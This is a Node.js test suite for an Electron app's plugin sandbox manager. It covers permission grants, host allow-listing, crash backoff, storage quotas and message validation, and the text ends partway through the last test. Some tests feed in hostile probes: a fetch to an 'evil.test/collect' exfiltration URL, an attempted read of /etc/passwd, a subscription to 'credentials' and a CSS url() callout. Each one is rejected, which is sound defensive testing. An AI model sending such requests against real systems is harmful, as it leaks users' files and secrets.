'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const { createDataBus } = require('../../src/shared/plugins/dataBus');
const { createPluginManager } = require('../../src/electron/plugins/manager');

function fakeClock() {
  let now = 1_000_000;
  let nextId = 1;
  const timers = new Map();
  return {
    now: () => now,
    setTimer(fn, ms) { const id = nextId++; timers.set(id, { at: now + ms, fn }); return id; },
    clearTimer(id) { timers.delete(id); },
    async advance(ms) {
      const target = now + ms;
      for (;;) {
        const due = [...timers.entries()].filter(([, timer]) => timer.at <= target).sort((a, b) => a[1].at - b[1].at)[0];
        if (!due) break;
        timers.delete(due[0]);
        now = due[1].at;
        await due[1].fn();
      }
      now = target;
    }
  };
}

function writePlugin(root, manifest, code) {
  const dir = path.join(root, manifest.id);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(manifest));
  if (code !== undefined) fs.writeFileSync(path.join(dir, 'main.js'), code);
  for (const asset of manifest.webUi?.assets || []) {
    fs.mkdirSync(path.dirname(path.join(dir, asset)), { recursive: true });
    fs.writeFileSync(path.join(dir, asset), '<html>fixture</html>');
  }
}

const SYSTEM = {
  id: 'sys-view', version: '1.0.0', tmApi: '^1', name: 'Sys',
  permissions: ['sys.cpu', 'notify'],
  views: [{ id: 'cpu', title: 'CPU', surfaces: ['home', 'edgeDock', 'tray'], compact: { value: { $: 'sys.cpu', fmt: 'percent' } }, layout: { type: 'stat', value: { $: 'sys.cpu', fmt: 'percent' } } }],
  alerts: [{ id: 'hot', title: 'Hot', message: 'CPU {value}', source: { $: 'sys.cpu', fmt: 'percent' }, op: '>=', value: 90, forSeconds: 10 }]
};
const CODE = {
  id: 'pulse', version: '1.0.0', tmApi: '^1', name: 'Pulse', main: 'main.js',
  permissions: ['tm.usage', 'network'], network: { hosts: ['api.example.com'] },
  background: { intervalSeconds: 30 },
  metrics: [{ id: 'tpm', kind: 'number' }, { id: 'chart', kind: 'draw' }],
  views: [{ id: 'pulse', title: 'Pulse', surfaces: ['home', 'notch'], layout: { type: 'stat', value: { $: '@tpm', fmt: 'compact' } } }]
};

function setup({ plugins = [SYSTEM, CODE], states = {}, netFetch, authorSettings, capabilities, realTime = false } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-plugins-'));
  const builtinDir = path.join(root, 'builtin');
  const userDir = path.join(root, 'user');
  fs.mkdirSync(builtinDir);
  fs.mkdirSync(userDir);
  for (const manifest of plugins) writePlugin(userDir, manifest, manifest.main ? 'tm.onTick(() => {});' : undefined);
  const clock = realTime ? { now: Date.now, setTimer: setTimeout, clearTimer: clearTimeout } : fakeClock();
  const bus = createDataBus({ now: clock.now, setTimer: clock.setTimer, clearTimer: clock.clearTimer, defer: (fn) => fn() });
  let samples = 0;
  bus.defineSource('sys.cpu', { sample: () => { samples += 1; return 42; } });
  let settings = { pluginStates: states };
  const notifications = [];
  const sent = [];
  const events = [];
  const running = new Set();
  const fetches = [];
  let manager = null;
  const sandbox = {
    start(id) { running.add(id); events.push(['start', id]); },
    stop(id) { if (running.delete(id)) events.push(['stop', id]); },
    kill(id, reason) { if (!running.delete(id)) return; events.push(['kill', id, reason]); manager.handleExit(id, reason); },
    send(id, message) { if (!running.has(id)) return false; sent.push([id, message]); return true; },
    metrics: () => ({}),
    running: () => [...running],
    isRunning: (id) => running.has(id),
    stopAll() { running.clear(); }
  };
  manager = createPluginManager({
    builtinDir,
    userDir,
    dataDir: path.join(root, 'data'),
    bus,
    sandbox,
    authorSettings,
    capabilities,
    notify: (note) => notifications.push(note),
    netFetch: netFetch || (async (url, init) => {
      fetches.push([url, init]);
      return { status: 200, ok: true, headers: new Map([['content-type', 'application/json']]), text: async () => '{"ok":true}' };
    }),
    getSettings: () => settings,
    saveStates: (next) => { settings = { ...settings, pluginStates: next }; },
    now: clock.now,
    setTimer: clock.setTimer,
    clearTimer: clock.clearTimer
  });
  manager.reload();
  return {
    manager, bus, clock, sent, events, notifications, fetches, running, sandbox,
    samples: () => samples,
    settings: () => settings,
    setSettings: (patch) => { settings = { ...settings, ...patch }; },
    root, userDir,
    plugin: (id) => manager.list().plugins.find((entry) => entry.id === id)
  };
}

test('plugins start disabled and enabling records exactly the requested grant', () => {
  const env = setup();
  assert.equal(env.plugin('sys-view').status, 'disabled');
  env.manager.setEnabled('sys-view', true);
  assert.equal(env.plugin('sys-view').status, 'active');
  assert.deepEqual(env.settings().pluginStates['sys-view'].grant, { permissions: ['notify', 'sys.cpu'], hosts: [] });
});

test('an update that widens access pauses the plugin until it is approved again', () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  writePlugin(env.userDir, { ...CODE, version: '1.1.0', permissions: [...CODE.permissions, 'sys.cpu'], network: { hosts: ['api.example.com', 'collector.example.net'] } }, 'tm.onTick(() => {});');
  env.manager.reload();
  const plugin = env.plugin('pulse');
  assert.equal(plugin.status, 'needsApproval');
  assert.deepEqual(plugin.missing, { permissions: ['sys.cpu'], hosts: ['collector.example.net'] });
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  assert.equal(env.running.has('pulse'), false, 'an unapproved plugin never runs');
  assert.equal(env.manager.payload('home').views['pulse/pulse'].status, 'needsApproval');
});

test('views sample only while shown; hiding the surface stops the source', async () => {
  const env = setup();
  env.manager.setEnabled('sys-view', true);
  env.manager.setBackground('sys-view', false);
  await env.clock.advance(60_000);
  assert.equal(env.samples(), 0, 'enabled but not placed or shown: nothing samples');
  env.manager.setSurfaceDemand('home', ['sys-view/cpu']);
  await env.clock.advance(10_000);
  const shown = env.samples();
  assert.ok(shown >= 5);
  env.manager.setSurfaceDemand('home', []);
  await env.clock.advance(60_000);
  assert.equal(env.samples(), shown);
  const payload = env.manager.payload('home');
  assert.deepEqual(payload.views, {});
});

test('background alerts keep their own slow cadence with no surface and notify once', async () => {
  const env = setup();
  env.manager.setEnabled('sys-view', true);
  env.manager.setBackground('sys-view', true);
  assert.deepEqual(env.bus.demandFor('alert:sys-view:hot'), { sources: ['sys.cpu'], lifecycle: 'background', intervalMs: 15_000 });
  await env.clock.advance(60_000);
  assert.ok(env.samples() >= 4 && env.samples() <= 5, `background cadence, got ${env.samples()}`);
  for (const at of [0, 6_000, 12_000]) {
    await env.clock.advance(at ? 6_000 : 0);
    env.bus.publish('sys.cpu', 95);
  }
  assert.equal(env.notifications.length, 1);
  assert.match(env.notifications[0].title, /^Sys · Hot$/);
  assert.equal(env.notifications[0].body, 'CPU 95%');
  env.manager.setBackground('sys-view', false);
  assert.equal(env.bus.demandFor('alert:sys-view:hot'), null);
});

test('a code plugin runs only on demand, ticks by lifecycle and is released when idle', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  // Explicitly enabled background work runs slowly with nothing on screen.
  assert.equal(env.running.has('pulse'), true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  const ticks = () => env.sent.filter(([, message]) => message.type === 'tick');
  assert.equal(ticks().at(-1)[1].mode, 'background');
  env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
  assert.equal(env.sent.filter(([, message]) => message.type === 'mode').at(-1)[1].mode, 'visible');
  env.manager.handleMessage('pulse', { type: 'tick-done', seq: ticks().at(-1)[1].seq });
  const before = ticks().length;
  await env.clock.advance(2_000);
  assert.equal(ticks().length, before + 1, 'visible ticks follow the visible interval');
  // A slow tick is not stacked.
  await env.clock.advance(10_000);
  assert.equal(ticks().length, before + 1);
  env.manager.handleMessage('pulse', { type: 'tick-done', seq: ticks().at(-1)[1].seq });
  env.manager.setBackground('pulse', false);
  env.manager.setSurfaceDemand('notch', []);
  assert.equal(env.running.has('pulse'), true, 'kept briefly so toggling a view does not respawn');
  await env.clock.advance(31_000);
  assert.equal(env.running.has('pulse'), false, 'released after the idle grace');
});

test('crashes restart with backoff and open the circuit after repeated failures', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  const starts = () => env.events.filter(([kind]) => kind === 'start').length;
  assert.equal(starts(), 1);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.running.delete('pulse');
  env.manager.handleExit('pulse', 'crashed:oom');
  assert.equal(env.plugin('pulse').runtime.state, 'backoff');
  await env.clock.advance(999);
  assert.equal(starts(), 1);
  await env.clock.advance(2);
  assert.equal(starts(), 2, 'first restart after one second');
  for (let attempt = 0; attempt < 3; attempt += 1) {
    env.running.delete('pulse');
    env.manager.handleExit('pulse', 'hung');
    await env.clock.advance(31_000);
  }
  assert.equal(env.plugin('pulse').status, 'crashed');
  assert.equal(env.running.has('pulse'), false);
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  assert.equal(env.plugin('pulse').status, 'active', 're-enabling closes the circuit');
  assert.equal(env.running.has('pulse'), true);
});

test('messages are validated by sender: undeclared metrics, unpermitted reads and floods', () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'tpm', value: 1200 });
  assert.equal(env.bus.read('plugin.pulse.tpm').value, 1200);
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'secret', value: 1 });
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'tpm', value: 'nope' });
  assert.equal(env.bus.read('plugin.pulse.secret'), null);
  assert.equal(env.bus.read('plugin.pulse.tpm').value, 1200);
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'chart', value: [{ op: 'rect', x: 0, y: 0, w: 1, h: 1, fill: 'url(https://evil.test)' }] });
  assert.equal(env.bus.read('plugin.pulse.chart').value[0].fill, undefined);
  // A plugin cannot read sources its grant does not cover, even with a forged id.
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'sys.cpu' });
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'credentials' });
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
  assert.equal(env.bus.demandFor('worker:pulse:sys.cpu'), null);
  assert.ok(env.bus.demandFor('worker:pulse:tm.today'));
  const logs = env.plugin('pulse').logs.map((entry) => entry.text).join('\n');
  assert.match(logs, /undeclared metric "secret"/);
  assert.match(logs, /subscribe sys\.cpu denied/);
  // A flood is dropped, then the process is killed.
  for (let index = 0; index < 700; index += 1) env.manager.handleMessage('pulse', { type: 'log', text: 'spam' });
  assert.ok(env.events.some(([kind, , reason]) => kind === 'kill' && reason === 'flooding'));
});

test('network requests reach only granted hosts over https', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  const results = () => env.sent.filter(([, message]) => message.type === 'result').map(([, message]) => message);
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'net.fetch', args: { url: 'https://evil.test/collect?d=1' } });
  env.manager.handleMessage('pulse', { type: 'call', id: 2, op: 'net.fetch', args: { url: 'http://api.example.com/v1' } });
  env.manager.handleMessage('pulse', { type: 'call', id: 3, op: 'net.fetch', args: { url: 'https://api.example.com/v1', init: { headers: { Cookie: 'x', Authorization: 'Bearer y' } } } });
  await new Promise((resolve) => setImmediate(resolve));
  const [evil, insecure, ok] = results().sort((a, b) => a.id - b.id);
  assert.equal(evil.ok, false);
  assert.match(evil.error, /not in network\.hosts/);
  assert.equal(insecure.ok, false);
  assert.equal(ok.ok, true);
  assert.equal(ok.value.text, '{"ok":true}');
  assert.equal(env.fetches.length, 1);
  assert.deepEqual(env.fetches[0][1].headers, { authorization: 'Bearer y' });
  assert.equal(env.fetches[0][1].redirect, 'manual');
});

test('storage persists per plugin within its quota; notify needs the permission', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: { tpm: 5 } } });
  env.manager.handleMessage('pulse', { type: 'call', id: 2, op: 'storage.get', args: { key: 'threshold' } });
  env.manager.handleMessage('pulse', { type: 'call', id: 3, op: 'storage.set', args: { key: 'big', value: 'x'.repeat(300 * 1024) } });
  env.manager.handleMessage('pulse', { type: 'call', id: 4, op: 'notify', args: { title: 'hi' } });
  env.manager.handleMessage('pulse', { type: 'call', id: 5, op: 'fs.read', args: { path: '/etc/passwd' } });
  await new Promise((resolve) => setImmediate(resolve));
  const byId = Object.fromEntries(env.sent.filter(([, message]) => message.type === 'result').map(([, message]) => [message.id, message]));
  assert.deepEqual(byId[2].value, { tpm: 5 });
  assert.match(byId[3].error, /quota/);
  assert.match(byId[4].error, /notify permission/);
  assert.match(byId[5].error, /unknown operation/);
  assert.equal(env.notifications.length, 0);
});

test('view payloads resolve per surface and keep placements of missing plugins visible as such', () => {
  const env = setup();
  env.manager.setEnabled('sys-view', true);
  env.bus.publish('sys.cpu', 37);
  env.manager.setSurfaceDemand('edgeDock', ['sys-view/cpu', 'gone/view']);
  env.manager.setSurfaceDemand('tray', ['sys-view/cpu']);
  const dock = env.manager.payload('edgeDock').views;
  assert.equal(dock['sys-view/cpu'].status, 'ok');
  assert.equal(dock['sys-view/cpu'].compact.value, '37%');
  assert.equal(dock['sys-view/cpu'].tree.value, '37%');
  assert.equal(dock['gone/view'].status, 'missing');
  assert.equal(env.manager.payload('tray').views['sys-view/cpu'].compact.value, '37%');
  env.setSettings({ pluginsEnabled: false });
  env.manager.settingsChanged();
  assert.equal(env.manager.payload('edgeDock').views['sys-view/cpu'].status, 'pluginsOff');
});

test('invalid and duplicate plugins are listed with their problems instead of loading', () => {
  const env = setup({ plugins: [SYSTEM, { ...SYSTEM, id: 'broken', tmApi: '^9' }] });
  writePlugin(path.join(env.root, 'builtin'), { ...SYSTEM, name: 'Shadow' });
  env.manager.reload();
  const broken = env.plugin('broken');
  assert.equal(broken.status, 'invalid');
  assert.match(broken.errors.join('\n'), /tmApi/);
  const system = env.manager.list().plugins.filter((plugin) => plugin.id === 'sys-view');
  assert.equal(system.length, 1, 'the first plugin with an id wins');
  assert.equal(system[0].source, 'builtin');
  assert.match(system[0].errors.join('\n'), /second plugin with id/);
});

test('master disable revokes code immediately and blocks late broker calls', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
  env.setSettings({ pluginsEnabled: false });
  env.manager.settingsChanged();
  assert.equal(env.running.has('pulse'), false);
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'net.fetch', args: { url: 'https://api.example.com/v1' } });
  env.bus.publish('tm.today', { tokens: 42 });
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(env.fetches.length, 0);
  assert.equal(env.sent.filter(([, m]) => m.type === 'data' && m.value?.tokens === 42).length, 0);
  env.manager.dispose();
});

test('idle grace retains only the process, without data delivery or broker activity', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
  env.manager.setBackground('pulse', false);
  assert.equal(env.running.has('pulse'), true);
  assert.equal(env.sent.filter(([, m]) => m.type === 'mode').at(-1)[1].mode, 'idle');
  env.bus.publish('tm.today', { tokens: 57 });
  env.manager.handleMessage('pulse', { type: 'call', id: 5, op: 'net.fetch', args: { url: 'https://api.example.com/v1' } });
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(env.sent.filter(([, m]) => m.type === 'data' && m.value?.tokens === 57).length, 0);
  assert.equal(env.fetches.length, 0);
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  assert.equal(env.sent.filter(([, m]) => m.type === 'data').at(-1)[1].value.tokens, 57);
  env.manager.dispose();
});

test('reload persists pending storage before replacing its owner', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: 123 } });
  env.manager.reload();
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'call', id: 2, op: 'storage.get', args: { key: 'threshold' } });
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(env.sent.find(([, m]) => m.type === 'result' && m.id === 2)[1].value, 123);
  env.manager.dispose();
});

test('a reduced manifest cannot use permissions or hosts from an older grant', async () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  writePlugin(env.userDir, { ...CODE, permissions: [], network: { hosts: [] } }, 'tm.onTick(() => {});');
  env.manager.reload();
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
  assert.equal(env.bus.demandFor('worker:pulse:tm.today'), null);
  env.manager.dispose();
});

test('restart aborts outstanding requests and never replies into the replacement worker', async () => {
  let finish;
  let requestSignal;
  const env = setup({ netFetch: (_url, init) => {
    requestSignal = init.signal;
    return new Promise(resolve => { finish = resolve; });
  } });
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'net.fetch', args: { url: 'https://api.example.com/v1' } });
  env.manager.restart('pulse');
  assert.equal(requestSignal.aborted, true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  finish({ status: 200, ok: true, headers: new Map(), text: async () => 'old response' });
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(env.sent.some(([, m]) => m.type === 'result' && m.id === 1), false);
  env.manager.dispose();
});


test('malformed structured-clone messages cannot escape into main or publish binary', () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  for (const message of [
    { type: 'subscribe', source: { toString: 0 } },
    { type: 'publish', metric: { toString: 0 }, value: 1 },
    { type: 'publish', metric: 'chart', value: [{ op: { toString: 0 } }] },
    { type: 'log', text: { toString: 0 } },
    { type: 'log', text: 'binary', extra: new ArrayBuffer(8 * 1024 * 1024) },
    { type: 'call', id: { toString: 0 }, op: 'storage.get', args: {} }
  ]) assert.doesNotThrow(() => env.manager.handleMessage('pulse', message));
  assert.equal(env.bus.read('plugin.pulse.chart'), null);
  assert.ok(env.plugin('pulse').logs.some(entry => entry.text.includes('invalid plugin message')));
  env.manager.dispose(); env.bus.dispose();
});

test('reload refuses to discard a dirty store when flushing fails, then recovers', () => {
  const env = setup();
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: 123 } });
  const data = path.join(env.root, 'data');
  fs.writeFileSync(data, 'blocks the directory');
  assert.throws(() => env.manager.reload());
  env.manager.handleMessage('pulse', { type: 'call', id: 2, op: 'storage.get', args: { key: 'threshold' } });
  assert.equal(env.sent.find(([, message]) => message.type === 'result' && message.id === 2)[1].value, 123);
  fs.unlinkSync(data);
  env.manager.reload();
  env.manager.handleMessage('pulse', { type: 'call', id: 3, op: 'storage.get', args: { key: 'threshold' } });
  assert.equal(env.sent.find(([, message]) => message.type === 'result' && message.id === 3)[1].value, 123);
  env.manager.dispose(); env.bus.dispose();
});

test('metric alerts start their code producer without a separately declared background tick', () => {
  const manifest = { ...CODE, permissions: ['notify'], network: undefined, background: undefined,
    alerts: [{ id: 'high', title: 'High', message: 'High', source: { $: '@tpm' }, op: '>', value: 90 }] };
  const env = setup({ plugins: [manifest] });
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  assert.equal(env.running.has('pulse'), true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'tpm', value: 100 });
  assert.equal(env.notifications.length, 1);
  assert.equal(env.plugin('pulse').runtime.mode, 'background');
  env.manager.setBackground('pulse', false);
  assert.equal(env.plugin('pulse').runtime.mode, null);
  env.manager.dispose(); env.bus.dispose();
});

test('expanded display-list references are stopped by a whole-view budget', () => {
  const manifest = { ...CODE, views: [{ id: 'pulse', title: 'Pulse', surfaces: ['home'],
    layout: { type: 'stack', children: Array.from({ length: 199 }, () => ({ type: 'draw', width: 400, height: 100, list: { $: '@chart' } })) } }] };
  const env = setup({ plugins: [manifest] });
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.handleMessage('pulse', { type: 'publish', metric: 'chart', value: Array.from({ length: 400 }, () => ({ op: 'rect', x: 0, y: 0, w: 1, h: 1 })) });
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  assert.equal(env.manager.payload('home').views['pulse/pulse'].status, 'error');
  assert.ok(env.plugin('pulse').logs.some(entry => /render budget/.test(entry.text)));
  env.manager.dispose(); env.bus.dispose();
});

test('discovery rechecks host compatibility before starting an enabled producer', t => {
  const host = require('../../package.json'), original = host.version;
  const env = setup({ plugins: [{ ...CODE, engines: { tokenMonitor: original } }] });
  t.after(() => { host.version = original; env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
  assert.equal(env.plugin('pulse').status, 'active');
  host.version = '999.0.0'; env.manager.reload();
  assert.equal(env.plugin('pulse').status, 'invalid');
  assert.equal(env.running.size, 0);
  assert.match(env.plugin('pulse').errors.join(' '), /incompatible/);
});

test('interactions are bound to an active declared control and a current runtime revision', t => {
  const interactive = { ...CODE, views: [{ id: 'editor', title: 'Editor', surfaces: ['home', 'page'], layout: { type: 'button', action: 'clear', label: 'Clear' } }] };
  const env = setup({ plugins: [interactive] }); t.after(() => { env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true); env.manager.handleMessage('pulse', { type: 'ready' });
  env.manager.setSurfaceDemand('page', ['pulse/editor']);
  const revision = () => env.manager.payload('page').views['pulse/editor'].revision;
  const event = { action: 'clear', type: 'press' }, oldRevision = revision();
  assert.equal(env.manager.interact('page', 'pulse/editor', event, oldRevision), true);
  const sent = env.sent.at(-1); assert.equal(sent[0], 'pulse'); assert.equal(sent[1].type, 'interaction');
  assert.deepEqual(sent[1].event, event);
  assert.throws(() => env.manager.interact('home', 'pulse/editor', event, oldRevision), /not active/);
  assert.throws(() => env.manager.interact('page', 'pulse/editor', { ...event, action: 'unknown' }, oldRevision), /declared control/);
  env.manager.handleMessage('pulse', { type: 'interaction-done', seq: sent[1].seq });
  env.manager.restart('pulse'); env.manager.handleMessage('pulse', { type: 'ready' });
  assert.throws(() => env.manager.interact('page', 'pulse/editor', event, oldRevision), /view changed/);
  for (let i = 0; i < 8; i++) env.manager.interact('page', 'pulse/editor', event, revision());
  assert.throws(() => env.manager.interact('page', 'pulse/editor', event, revision()), /busy/);
  env.manager.setEnabled('pulse', false);
  assert.throws(() => env.manager.interact('page', 'pulse/editor', event, oldRevision), /unavailable/);
});

test('static action views receive ready state without publishing metrics', async t => {
  const plugin = { id: 'actions', name: 'Actions', version: '1.0.0', tmApi: '^1', main: 'main.js', views: [{ id: 'page', title: 'Page', surfaces: ['page'], layout: { type: 'button', action: 'go', label: 'Go' } }] };
  const f = setup({ plugins: [plugin] }); t.after(() => { f.manager.dispose(); f.bus.dispose(); fs.rmSync(f.root, { recursive: true, force: true }); });
  const pushes = []; f.manager.onViews((surface, payload) => { if (surface === 'page') pushes.push(payload); });
  f.manager.setEnabled('actions', true); f.manager.setSurfaceDemand('page', ['actions/page']);
  await f.clock.advance(300); assert.equal(pushes.at(-1).views['actions/page'].pending, 'starting');
  f.manager.handleMessage('actions', { type: 'ready' }); await f.clock.advance(300);
  assert.equal(pushes.at(-1).views['actions/page'].pending, undefined);
});
test('idle teardown clears pending actions before a new Worker generation', async t => {
  const plugin = { id: 'actions', name: 'Actions', version: '1.0.0', tmApi: '^1', main: 'main.js', views: [{ id: 'page', title: 'Page', surfaces: ['page'], layout: { type: 'button', action: 'go', label: 'Go' } }] };
  const f = setup({ plugins: [plugin] }); t.after(() => { f.manager.dispose(); f.bus.dispose(); fs.rmSync(f.root, { recursive: true, force: true }); });
  f.manager.setEnabled('actions', true); f.manager.setSurfaceDemand('page', ['actions/page']); f.manager.handleMessage('actions', { type: 'ready' });
  f.manager.interact('page', 'actions/page', { action: 'go', type: 'press' }, f.manager.payload('page').views['actions/page'].revision);
  f.manager.setSurfaceDemand('page', []);
  for (let n = 0; n < 30; n++) { f.manager.handleMessage('actions', { type: 'heartbeat' }); await f.clock.advance(1000); }
  f.manager.setSurfaceDemand('page', ['actions/page']); f.manager.handleMessage('actions', { type: 'ready' });
  f.manager.handleMessage('actions', { type: 'heartbeat' }); await f.clock.advance(5000);
  assert.equal(f.events.some(event => event[0] === 'kill' && event[2] === 'interaction-timeout'), false);
});

for (const message of [{ type: 'tick-done', seq: 1 }, { type: 'call', id: 99, op: 'storage.get', args: { key: 'x' } }]) {
  test(`main recovers from a rate-limited ${message.type} without waiting for a flood`, async () => {
    const env = setup();
    try {
      env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
      env.manager.handleMessage('pulse', { type: 'ready' });
      for (let i = 0; i < 199; i++) env.manager.handleMessage('pulse', { type: 'log', text: 'burst' });
      env.manager.handleMessage('pulse', message);
      assert.equal(env.plugin('pulse').runtime.state, 'backoff');
      assert.ok(env.events.some(e => e[0] === 'kill' && e[2] === 'protocol-rate-limit'));
      await env.clock.advance(1001);
      env.manager.handleMessage('pulse', { type: 'ready' });
      assert.equal(env.plugin('pulse').runtime.state, 'running');
      const tick = env.sent.filter(([, m]) => m.type === 'tick').at(-1)[1];
      env.manager.handleMessage('pulse', { type: 'tick-done', seq: tick.seq });
      env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
      assert.ok(env.sent.filter(([, m]) => m.type === 'tick').length >= 3);
    } finally { env.manager.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
  });
}

test('a healthy heartbeat cannot hide a stuck tick and stale completions cannot release it', async () => {
  const env = setup();
  try {
    env.manager.setEnabled('pulse', true);
  env.manager.setBackground('pulse', true);
    env.manager.handleMessage('pulse', { type: 'ready' });
    env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
    for (let i = 0; i < 30; i++) {
      env.manager.handleMessage('pulse', { type: 'heartbeat' });
      env.manager.handleMessage('pulse', { type: 'tick-done', seq: 999 });
      await env.clock.advance(1000);
    }
    assert.equal(env.sent.filter(([, m]) => m.type === 'tick').length, 1, 'wrong sequence cannot stack ticks');
    assert.ok(env.events.some(e => e[0] === 'kill' && e[2] === 'tick-timeout'));
    await env.clock.advance(1001);
    env.manager.handleMessage('pulse', { type: 'ready' });
    assert.equal(env.sent.filter(([, m]) => m.type === 'tick').length, 2, 'bounded restart resumes ticks');
  } finally { env.manager.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
});

test('background is opt-in; shared samples stop after hide, disable and removal', async () => {
  const other = { ...SYSTEM, id: 'other-sys', alerts: [] };
  const env = setup({ plugins: [SYSTEM, other, CODE] });
  try {
    for (const id of ['sys-view', 'other-sys', 'pulse']) env.manager.setEnabled(id, true);
    await env.clock.advance(60000);
    assert.equal(env.samples(), 0);
    assert.equal(env.running.size, 0, 'declared background does not start without consent');
    env.manager.setSurfaceDemand('home', ['sys-view/cpu', 'other-sys/cpu']);
    await env.clock.advance(10000);
    assert.equal(env.samples(), 6, 'two plugins share one immediate sample and five ticks');
    env.manager.setEnabled('sys-view', false);
    await env.clock.advance(2000);
    assert.equal(env.samples(), 7, 'remaining consumer retains the single sampler');
    env.manager.setSurfaceDemand('home', []);
    await env.clock.advance(60000);
    assert.equal(env.samples(), 7);
    env.manager.setSurfaceDemand('home', ['other-sys/cpu']);
    await env.clock.advance(2000);
    fs.rmSync(path.join(env.userDir, 'other-sys'), { recursive: true });
    env.manager.reload();
    const afterRemoval = env.samples();
    await env.clock.advance(60000);
    assert.equal(env.samples(), afterRemoval, 'removed producer has no retained demand');
    env.manager.setEnabled('sys-view', true);
    env.manager.setBackground('sys-view', true);
    await env.clock.advance(15000);
    assert.ok(env.samples() > afterRemoval);
    env.manager.setBackground('sys-view', false);
    const afterOptOut = env.samples(); await env.clock.advance(60000);
    assert.equal(env.samples(), afterOptOut);
  } finally { env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
});


test('authored page demand starts its Worker without revoking the document and releases on hide', async t => {
  const web = { ...CODE, permissions: [...CODE.permissions, 'ui.web', 'tm.pages'], webUi: { version: 1, assets: ['index.html'], documents: [{ id: 'models', entry: 'index.html', target: 'model', slot: 'replace' }] } };
  const env = setup({ plugins: [web] }); t.after(() => { env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true);
  const revision = env.manager.webDocument('pulse/models').revision;
  assert.equal(env.running.size, 0);
  env.manager.setWebVisible('page', 'pulse/models');
  assert.equal(env.running.has('pulse'), true);
  assert.equal(env.manager.webDocument('pulse/models').revision, revision);
  assert.equal(env.manager.webReadAllowed('pulse/models', '@tpm'), true);
  assert.equal(env.manager.webReadAllowed('pulse/models', '@foreign'), false);
  assert.equal(env.manager.webSource('pulse/models', '@tpm'), 'plugin.pulse.tpm');
  env.manager.setWebVisible('page', null);
  await env.clock.advance(31_000);
